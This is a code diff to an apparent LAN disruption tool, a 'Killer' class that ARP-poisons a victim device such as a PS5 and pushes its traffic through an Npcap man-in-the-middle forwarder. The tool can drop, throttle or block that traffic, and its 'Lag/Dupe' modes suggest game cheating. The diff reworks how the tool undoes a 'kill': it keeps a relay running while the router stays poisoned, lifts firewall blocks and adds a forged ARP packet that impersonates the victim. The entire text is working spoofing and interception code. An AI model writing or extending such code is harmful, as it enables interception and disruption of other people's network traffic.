@@ -710,6 +710,11 @@ class Killer:
             except Exception:
                 mac = GLOBAL_MAC
         if mac_address_is_usable(mac) and isinstance(self.router, dict):
+            mine = good_mac(getattr(self.iface, 'mac', None) or '')
+            # Reflected Wi‑Fi poison can teach Windows that the gateway is us.
+            # Restore must keep the real router MAC from Kill ON.
+            if mine and good_mac(mac) == mine:
+                return
             self.router['mac'] = mac
 
     def mitm_prereqs_ok(self, victim, *, ping_attempts: int = 1) -> tuple[bool, str]:
@@ -1225,7 +1230,7 @@ class Killer:
         if not mac:
             return False
         fw = self.forwarders.get(mac)
-        if fw is None:
+        if fw is None or not getattr(fw, 'running', False):
             return False
         try:
             if hasattr(fw, 'pass_all_live'):
@@ -1238,6 +1243,68 @@ class Killer:
             return True
         except Exception:
             return False
+
+    def _ensure_unkill_pass_relay(self, victim) -> bool:
+        """100% Npcap relay after Kill OFF. Never leave a hard-drop running."""
+        mac = str((victim or {}).get('mac') or '').strip() if isinstance(victim, dict) else ''
+        if not mac:
+            return False
+        if self.resume_percent_cut_live(mac):
+            return True
+        if not isinstance(victim, dict):
+            return False
+        if not mac_address_is_usable((self.router or {}).get('mac')):
+            return False
+        tokens = npcap_iface_tokens(self.iface)
+        if not tokens:
+            return False
+        try:
+            self._get_socket()
+        except Exception:
+            pass
+        fw = MitmForwarder(debug=False)
+        fw.start(
+            victim=victim,
+            router=self.router,
+            iface_name=tokens[0],
+            iface_mac=getattr(self.iface, 'mac', None),
+            drop_from_victim=False,
+            drop_to_victim=False,
+            pass_from_victim_pct=100,
+            pass_to_victim_pct=100,
+            iface_alts=tokens[1:],
+        )
+        if not (fw and getattr(fw, 'running', False)):
+            return False
+        self.forwarders[mac] = fw
+        return True
+
+    def _unblock_victim_firewall(self, victim) -> None:
+        """Drop Kill's Windows Firewall / pf block immediately (do not wait on restore)."""
+        ip = str((victim or {}).get('ip') or '').strip() if isinstance(victim, dict) else ''
+        if not ip:
+            return
+        try:
+            self._remove_pf_block(ip)
+        except Exception:
+            pass
+
+        def _work():
+            try:
+                from tools.pfctl import unblock_ip
+
+                unblock_ip(ip)
+            except Exception:
+                pass
+
+        try:
+            threading.Thread(
+                target=safe_daemon_target(_work),
+                daemon=True,
+                name='zubcut-unkill-fw',
+            ).start()
+        except Exception:
+            _work()
 
     def apply_link_shaping(
         self,
@@ -1337,9 +1404,8 @@ class Killer:
                 sleep(step)
                 slept += step
 
-        if victim['mac'] not in self.killed:
-            if victim['mac'] not in getattr(self, '_unkill_relays', ()):
-                self._stop_forwarder(victim['mac'])
+        # Do not stop the Npcap forwarder here. unkill() owns teardown; racing
+        # this worker with Kill OFF was dropping the pass-through relay.
 
     def unkill(self, victim, *, ics_mode=False):
         """
@@ -1357,20 +1423,28 @@ class Killer:
                 pass
         mac = victim['mac']
         if not ics_mode:
-            # Instant OFF: keep Npcap pass-through while the console still thinks
-            # this PC is the gateway. Stopping the forwarder here is what made
-            # mesh Wi‑Fi Kill OFF wait for ARP timeout.
-            self.resume_percent_cut_live(mac)
+            # Instant OFF: flip the cut relay to 100% pass and leave it up.
+            # Analysis DURING proved PS5 WAN already hits this PC; stopping
+            # that relay (with IP forwarding still off) black-holes the
+            # console until ARP times out. Router ARP is often still poisoned,
+            # so return traffic also dies here unless we keep forwarding.
+            self._ensure_unkill_pass_relay(victim)
             relays = getattr(self, '_unkill_relays', None)
             if relays is None:
                 self._unkill_relays = set()
                 relays = self._unkill_relays
             relays.add(mac)
+            self._unblock_victim_firewall(victim)
         seq = self._next_op_seq(mac)
         if mac in self.killed:
             self.killed.pop(mac)
         if ics_mode:
             self._stop_forwarder(mac)
+        elif not self.killed:
+            enable_ip_forwarding(
+                priority_iface=getattr(self.iface, 'name', None),
+                priority_only=True,
+            )
         # Immediate ARP burst with no sleep — sleeps belong in @threaded _unkill_restore_worker
         # so the GUI thread returns instantly on Kill/Lag/Dupe OFF.
         # Never open a cold Npcap L2 socket on this thread (0.5–2s, or hang).
@@ -1486,6 +1560,18 @@ class Killer:
                             hwsrc=router_mac,
                             pdst=victim_ip,
                             hwdst=victim_mac,
+                        ),
+                        # Who-has gateway, tell the PS5 — mesh-floods onto ethernet
+                        # so the real router answers the console on the wired path
+                        # (Ether src == hwsrc). Direct honest ARP from this STA is
+                        # often ignored; this is how return traffic comes back.
+                        Ether(src=src, dst=bcast)
+                        / ARP(
+                            op=1,
+                            psrc=victim_ip,
+                            hwsrc=victim_mac,
+                            pdst=router_ip,
+                            hwdst='00:00:00:00:00:00',
                         ),
                     ]
                 )
